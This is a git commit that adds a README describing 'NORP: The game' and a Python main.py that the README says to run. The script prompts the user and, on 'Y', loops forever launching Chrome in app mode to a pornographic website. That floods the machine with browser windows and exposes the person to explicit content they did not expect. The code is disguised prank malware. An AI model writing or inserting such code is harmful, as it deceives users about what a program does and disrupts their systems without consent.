edbf18dc24c42bc36f02cea4d7dc4ac0c692e515
kernelk14 <khyleisaias@gmail.com>
2022-08-03 10:55:36 +0800

    Added Files

---
+++ README.md
@@ -0,0 +1,5 @@
+# NORP: The game
+
+# Quick Start
+
+Clone this repo, then run `python main.py`
---
+++ main.py
@@ -0,0 +1,19 @@
+import os
+
+def goodbye():
+    while True:
+        os.system("\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --chrome-frame --app=https://pornhub.com")
+
+
+if __name__ == '__main__':
+    x = input("Excited ka na ba? [Y/n] ")
+    if x == 'Y':
+        goodbye()
+    elif x == 'y':
+        goodbye()
+    elif x == 'n':
+        print("Dapat pinindot mo yung Y")
+        exit(0)
+    elif x == 'N':
+        print("Dapat pinindot mo yung Y")
+        exit(0)
